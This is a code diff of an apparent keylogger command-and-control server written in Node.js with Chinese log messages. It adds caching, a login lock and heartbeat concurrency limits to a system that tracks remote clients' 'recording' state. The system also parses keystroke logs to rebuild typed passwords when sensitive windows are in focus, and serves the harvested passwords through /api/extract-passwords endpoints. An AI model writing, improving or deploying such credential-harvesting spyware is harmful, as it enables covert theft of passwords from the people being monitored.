@@ -126,6 +126,7 @@ const CONFIG = {
     extractConcurrency: parseInt(process.env.EXTRACT_CONCURRENCY) || 10,
     deleteConcurrency: parseInt(process.env.DELETE_CONCURRENCY) || 10,
     commandConcurrency: parseInt(process.env.COMMAND_CONCURRENCY) || 10,
+    heartbeatConcurrency: parseInt(process.env.HEARTBEAT_CONCURRENCY) || 20,
 };
 
 // ========== 环境变量二次校验 ==========
@@ -202,7 +203,6 @@ let wss;
 app.use(cors());
 app.use(express.json());
 
-// ========== 重要修复：定义 asyncHandler 中间件 ==========
 const asyncHandler = fn => (req, res, next) => {
     Promise.resolve(fn(req, res, next)).catch(next);
 };
@@ -296,6 +296,12 @@ class AlistClient {
             maxContentLength: 50 * 1024 * 1024,
             maxBodyLength: 50 * 1024 * 1024,
         });
+        this.cache = new LRUCache({
+            max: 300,
+            ttl: 5 * 60 * 1000,
+            updateAgeOnGet: true
+        });
+        this.loginPromise = null;
     }
 
     async _request(method, endpoint, data = null, options = {}, retry = true) {
@@ -348,8 +354,21 @@ class AlistClient {
 
     async _ensureToken() {
         if (!this.token || Date.now() >= this.tokenExpire) {
-            await this._login();
+            if (!this.loginPromise) {
+                this.loginPromise = this._login().finally(() => {
+                    this.loginPromise = null;
+                });
+            }
+            await this.loginPromise;
         }
+    }
+
+    _getCacheKey(prefix, key) {
+        return `${prefix}:${key}`;
+    }
+
+    _invalidateCache(key) {
+        this.cache.delete(key);
     }
 
     _getFullPath(relativePath) {
@@ -372,6 +391,13 @@ class AlistClient {
 
     async listFiles(dirPath) {
         const fullPath = this._getFullPath(dirPath);
+        const cacheKey = this._getCacheKey('list', fullPath);
+
+        const cached = this.cache.get(cacheKey);
+        if (cached) {
+            return cached;
+        }
+
         try {
             const result = await this._request('GET', `/api/fs/list?path=${encodeURIComponent(fullPath)}`);
             if (result.code === 200) {
@@ -383,11 +409,13 @@ class AlistClient {
                 } else if (Array.isArray(result.data)) {
                     items = result.data;
                 }
-                return items.map(item => ({
+                const transformed = items.map(item => ({
                     filename: item.name || item.filename || 'unknown',
                     size: item.size || 0,
                     uploadTime: new Date(item.modified || item.updated || item.mtime || Date.now())
                 }));
+                this.cache.set(cacheKey, transformed);
+                return transformed;
             }
             return [];
         } catch (err) {
@@ -469,6 +497,7 @@ class AlistClient {
                 'Content-Length': Buffer.byteLength(content)
             }
         });
+        this._invalidateCache(this._getCacheKey('list', fullDir));
         this.logger.info(`文件上传成功: ${fullPath}`);
         return { success: true, filename };
     }
@@ -484,6 +513,7 @@ class AlistClient {
             names: [filename]
         });
 
+        this._invalidateCache(this._getCacheKey('list', dir));
         this.logger.info(`文件已删除: ${fullPath}`);
         return { success: true };
     }
@@ -761,7 +791,7 @@ class ClientManager {
     handleResponse(client, response) {
     client.lastSeen = new Date();
     updateLastSeen(client.id).catch(e => this.logger.error(e));
-    this.logger.silly(`客户端 ${client.id} 响应数据: ${JSON.stringify(response)}`);
+    this.logger.debug(`客户端 ${client.id} 响应数据: ${JSON.stringify(response)}`);
 
     if (response.status === 'ok' && response.data) {
         if (response.data.recording !== undefined) {
@@ -810,23 +840,28 @@ class ClientManager {
     }
 
     startHeartbeat() {
+        const limit = pLimit(CONFIG.heartbeatConcurrency);
         this.heartbeatTimer = setInterval(() => {
-            this.clients.forEach(async (client, clientId) => {
+            const heartbeatTasks = [];
+            this.clients.forEach((client, clientId) => {
                 if (client.status === 'online') {
-                    try {
-                        const result = await this.sendCommand(clientId, { action: 'ping' });
-                        if (!result.success) {
-                            this.logger.warn(`心跳失败: ${clientId}`);
+                    heartbeatTasks.push(limit(async () => {
+                        try {
+                            const result = await this.sendCommand(clientId, { action: 'ping' });
+                            if (!result.success) {
+                                this.logger.warn(`心跳失败: ${clientId}`);
+                                this.markClientOffline(client);
+                                this.reconnectSingleClient(clientId).catch(e => this.logger.error(e));
+                            }
+                        } catch (e) {
+                            this.logger.warn(`心跳异常: ${clientId}`, { error: e.message });
                             this.markClientOffline(client);
                             this.reconnectSingleClient(clientId).catch(e => this.logger.error(e));
                         }
-                    } catch (e) {
-                        this.logger.warn(`心跳异常: ${clientId}`, { error: e.message });
-                        this.markClientOffline(client);
-                        this.reconnectSingleClient(clientId).catch(e => this.logger.error(e));
-                    }
+                    }));
                 }
             });
+            Promise.allSettled(heartbeatTasks).catch(err => this.logger.error('心跳批量任务异常', { error: err.message }));
         }, CONFIG.heartbeatInterval);
     }
 
@@ -924,34 +959,29 @@ class ClientManager {
     }
 
     broadcastClientUpdate(client, eventType) {
-        const updateMsg = JSON.stringify({
+        const message = JSON.stringify({
             type: 'client_updated',
             event: eventType,
             client: this.getClientInfo(client)
         });
-        const listMsg = JSON.stringify({
-            type: 'clients_list',
-            clients: this.getAllClients()
-        });
 
-        const messages = [updateMsg, listMsg];
         this.webClients.forEach(ws => {
             if (ws.readyState === WebSocket.OPEN) {
                 if (ws.bufferedAmount > 64 * 1024) {
                     this.logger.warn(`WebSocket 积压过高 (${ws.bufferedAmount} 字节)，延迟广播`);
                     setTimeout(() => {
                         if (ws.readyState === WebSocket.OPEN) {
-                            messages.forEach(msg => ws.send(msg, (err) => {
+                            ws.send(message, (err) => {
                                 if (err) this.logger.debug('延迟广播发送失败', { error: err.message });
-                            }));
+                            });
                         }
                     }, 100);
                     return;
                 }
                 setImmediate(() => {
-                    messages.forEach(msg => ws.send(msg, (err) => {
+                    ws.send(message, (err) => {
                         if (err) this.logger.debug('广播消息发送失败', { error: err.message });
-                    }));
+                    });
                 });
             }
         });
@@ -1029,7 +1059,6 @@ class ClientManager {
         return null;
     }
 
-    // 修复：彻底清理事件监听，防止内存泄漏
     tryConnect(ip, port) {
         return new Promise((resolve) => {
             const cleanIp = ip.split('/')[0];
@@ -1663,9 +1692,10 @@ function parsePasswordFromSequence(sequence, initialShift, initialCtrl, initialA
 
         let char = item;
         if (item.length === 1) {
-            const isLetter = /^[a-zA-Z]$/.test(item);
-            const isUpperCase = /^[A-Z]$/.test(item);
-            const isLowerCase = /^[a-z]$/.test(item);
+            const code = item.charCodeAt(0);
+            const isUpperCase = code >= 65 && code <= 90;
+            const isLowerCase = code >= 97 && code <= 122;
+            const isLetter = isUpperCase || isLowerCase;
             
             // 大写字母表示需要按下 shift，小写字母表示不需要
             if (isUpperCase) {
@@ -1697,6 +1727,8 @@ function parsePasswordFromSequence(sequence, initialShift, initialCtrl, initialA
 function extractPasswordsFromLog(content, filename) {
     const passwords = [];
     const lines = content.split('\n');
+    const windowTimestampRegex = /at (\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}[+-]\d{4})/;
+    const windowTitleRegex = /\[Window:\s*(.+?)\s*-?\s*at/;
 
     let currentWindow = '';
     let timestamp = null;
@@ -1747,9 +1779,9 @@ function extractPasswordsFromLog(content, filename) {
             ctrlPressed = false;
             altPressed = false;
 
-            const tsMatch = line.match(/at (\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}[+-]\d{4})/);
+            const tsMatch = line.match(windowTimestampRegex);
             if (tsMatch) timestamp = tsMatch[1];
-            const winMatch = line.match(/\[Window:\s*(.+?)\s*-?\s*at/);
+            const winMatch = line.match(windowTitleRegex);
             if (winMatch) currentWindow = winMatch[1].trim();
 
             // 进入敏感窗口时开启密码捕获模式
@@ -1861,10 +1893,14 @@ app.post('/api/extract-passwords', asyncHandler(async (req, res) => {
     }
 
     const filesToProcess = [];
+    const changedFileNames = new Set();
     for (const file of logFiles) {
         const mtime = currentFileStates.get(file.filename).mtime;
         const cachedMtime = extractionCache.fileMTimes.get(file.filename);
-        if (!cachedMtime || cachedMtime !== mtime) filesToProcess.push(file);
+        if (!cachedMtime || cachedMtime !== mtime) {
+            filesToProcess.push(file);
+            changedFileNames.add(file.filename);
+        }
     }
 
     logger.info(`密码提取：共 ${logFiles.length} 个日志文件，其中 ${filesToProcess.length} 个需要处理`);
@@ -1895,8 +1931,7 @@ app.post('/api/extract-passwords', asyncHandler(async (req, res) => {
     });
 
     const unchangedFileNames = new Set(
-        logFiles.filter(f => !filesToProcess.some(pf => pf.filename === f.filename))
-            .map(f => f.filename)
+        logFiles.filter(f => !changedFileNames.has(f.filename)).map(f => f.filename)
     );
     const cachedPasswordsFromUnchangedFiles = extractionCache.passwords.filter(item =>
         unchangedFileNames.has(item.file)
@@ -1983,8 +2018,12 @@ app.delete('/api/blacklist/:id', asyncHandler(async (req, res) => {
 
 app.get('/api/extract-passwords/view', asyncHandler(async (req, res) => {
     const filePath = path.join(__dirname, 'logs', 'extracted_passwords.txt');
-    if (!fs.existsSync(filePath)) return res.status(404).send('提取结果文件不存在');
-    const content = fs.readFileSync(filePath, 'utf8');
+    try {
+        await fs.promises.access(filePath, fs.constants.R_OK);
+    } catch (e) {
+        return res.status(404).send('提取结果文件不存在');
+    }
+    const content = await fs.promises.readFile(filePath, 'utf8');
     res.type('text/plain').send(content);
 }));
 
